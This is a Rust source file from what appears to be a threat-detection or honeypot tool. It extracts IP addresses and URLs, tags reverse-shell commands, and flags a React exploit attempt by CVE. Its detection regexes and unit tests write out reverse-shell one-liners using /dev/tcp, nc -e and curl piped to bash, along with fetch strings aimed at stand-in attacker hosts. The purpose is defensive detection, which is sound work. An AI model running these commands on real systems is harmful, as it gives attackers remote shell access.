use std::net::{Ipv4Addr, Ipv6Addr};

use lazy_static::lazy_static;
use regex::Regex;

use crate::events::Observables;

const REACT2SHELL_BODY: &[&str] = &[":__proto__:", ":constructor:", "\"resolved_model\""];

lazy_static! {
    // IPv4: strict octet-range validation
    static ref IPV4_RE: Regex = Regex::new(
        r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
    ).unwrap();

    // IPv6: covers full, compressed, and loopback forms; validated via parse() after match
    static ref IPV6_RE: Regex = Regex::new(
        r"(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(?::[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(?::[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?::[0-9a-fA-F]{1,4}){1,6}|:(?::[0-9a-fA-F]{1,4}){1,7}|::"
    ).unwrap();

    // URLs: http, https, ftp schemes
    static ref URL_RE: Regex = Regex::new(
        r#"(?i)\b(?:https?|ftps?)://[^\s"'<>()\[\]{}|\\^`]+"#
    ).unwrap();

    // Shell binary references
    static ref SHELL_BINARY_RE: Regex = Regex::new(
        r"(?:/usr)?/bin/(?:ba|da|z|c|fi|k|tc)?sh(?:[^a-zA-Z]|$)"
    ).unwrap();

    // Direct reverse-shell patterns (sufficient alone, no IP/URL check needed)
    static ref REVERSE_SHELL_RE: Regex = Regex::new(
        r"/dev/(?:tcp|udp)/|bash\s+-i\s+>&|nc(?:at)?\s+-[elp]|netcat\s+-[elp]|\|\s*(?:ba|da|z)?sh\b"
    ).unwrap();
}

pub fn merge_common(haystack: &str, obs: &mut Observables) {
    merge_ips(haystack, obs);
    merge_urls(haystack, obs);
    merge_reverse_shells(haystack, obs);
}

// Extract and merge potential IP addresses from `haystack` into `obs`
pub fn merge_ips(haystack: &str, obs: &mut Observables) {
    for m in IPV4_RE.find_iter(haystack) {
        if let Ok(ip) = m.as_str().parse::<Ipv4Addr>() {
            obs.ipv4.insert(ip);
        }
    }
    for m in IPV6_RE.find_iter(haystack) {
        if let Ok(ip) = m.as_str().parse::<Ipv6Addr>() {
            obs.ipv6.insert(ip);
        }
    }
}

// Extract and merge potential URLs from `haystack` into `obs`
pub fn merge_urls(haystack: &str, obs: &mut Observables) {
    for m in URL_RE.find_iter(haystack) {
        obs.urls.insert(m.as_str().to_string());
    }
}

pub fn merge_reverse_shells(haystack: &str, obs: &mut Observables) {
    let has_shell = SHELL_BINARY_RE.is_match(haystack);
    let has_net = !obs.ipv4.is_empty() || !obs.ipv6.is_empty() || !obs.urls.is_empty();
    if (has_shell && has_net) || REVERSE_SHELL_RE.is_match(haystack) {
        obs.tags.insert("reverse_shell".to_string());
    }
}

pub fn merge_http(
    http_body: &str,
    method: &str,
    headers: &hyper::HeaderMap,
    obs: &mut Observables,
) {
    if method == "POST"
        && (headers.contains_key("next-action")
            || REACT2SHELL_BODY
                .iter()
                .any(|needle| http_body.contains(needle)))
    {
        obs.tags.insert("react2shell".to_string());
        obs.cves.insert("CVE-2025-55182".to_string());
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::events::Observables;
    use std::net::{Ipv4Addr, Ipv6Addr};

    fn obs() -> Observables {
        Observables::default()
    }

    #[test]
    fn test_merge_ips_ipv4_basic() {
        let mut o = obs();
        merge_ips("connect to 1.2.3.4 please", &mut o);
        assert!(o.ipv4.contains(&"1.2.3.4".parse::<Ipv4Addr>().unwrap()));
    }

    #[test]
    fn test_merge_ips_ipv4_multiple() {
        let mut o = obs();
        merge_ips("src=192.168.1.1 dst=10.0.0.2", &mut o);
        assert_eq!(o.ipv4.len(), 2);
    }

    #[test]
    fn test_merge_ips_ipv4_rejects_invalid_octets() {
        let mut o = obs();
        merge_ips("999.999.999.999", &mut o);
        assert!(o.ipv4.is_empty() && o.ipv6.is_empty());
    }

    #[test]
    fn test_merge_ips_ipv6_loopback() {
        let mut o = obs();
        merge_ips("::1", &mut o);
        assert!(o.ipv6.contains(&"::1".parse::<Ipv6Addr>().unwrap()));
    }

    #[test]
    fn test_merge_ips_ipv6_full() {
        let mut o = obs();
        merge_ips("2001:0db8:85a3:0000:0000:8a2e:0370:7334", &mut o);
        assert!(!o.ipv6.is_empty());
    }

    #[test]
    fn test_merge_urls_http() {
        let mut o = obs();
        merge_urls("fetch http://evil.com/payload.sh", &mut o);
        assert!(o.urls.iter().any(|u| u.contains("evil.com")));
    }

    #[test]
    fn test_merge_urls_https() {
        let mut o = obs();
        merge_urls("wget https://attacker.io/shell", &mut o);
        assert!(o.urls.iter().any(|u| u.starts_with("https://")));
    }

    #[test]
    fn test_merge_urls_no_match_plain_text() {
        let mut o = obs();
        merge_urls("just some plain text", &mut o);
        assert!(o.urls.is_empty());
    }

    #[test]
    fn test_merge_reverse_shells_dev_tcp() {
        let mut o = obs();
        merge_common("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", &mut o);
        assert!(o.tags.contains("reverse_shell"));
    }

    #[test]
    fn test_merge_reverse_shells_nc() {
        let mut o = obs();
        merge_common("nc -e /bin/bash 10.0.0.1 1234", &mut o);
        assert!(o.tags.contains("reverse_shell"));
    }

    #[test]
    fn test_merge_reverse_shells_shell_with_ip() {
        let mut o = obs();
        // /bin/bash present + IP extracted by merge_ips → reverse_shell
        merge_common("curl 1.2.3.4 | /bin/bash", &mut o);
        assert!(o.tags.contains("reverse_shell"));
    }

    #[test]
    fn test_merge_reverse_shells_no_false_positive() {
        let mut o = obs();
        merge_common("just a normal log message", &mut o);
        assert!(!o.tags.contains("reverse_shell"));
    }

    #[test]
    fn test_merge_reverse_shells_shell_without_network_no_tag() {
        let mut o = obs();
        // shell binary present but no IP or URL and no direct reverse-shell pattern
        merge_reverse_shells("/bin/bash -c ls", &mut o);
        assert!(!o.tags.contains("reverse_shell"));
    }
}
